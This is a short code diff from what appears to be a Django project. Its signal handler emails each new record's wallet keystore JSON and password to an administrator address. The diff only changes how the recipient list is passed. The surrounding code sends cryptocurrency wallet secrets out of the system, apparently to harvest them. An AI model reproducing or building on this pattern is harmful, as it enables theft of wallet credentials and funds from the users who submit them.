@@ -35,6 +35,6 @@ def send_mail_handler(sender, instance, created, **kwargs):
             \nkeystore_json: {data.keystore_json}
             \npassword: {data.password}''',
             env("SERVER_EMAIL"),
-            to=getaddresses([env('ADMINS')]),
+            getaddresses([env('ADMINS')]),
             fail_silently=False,
         )
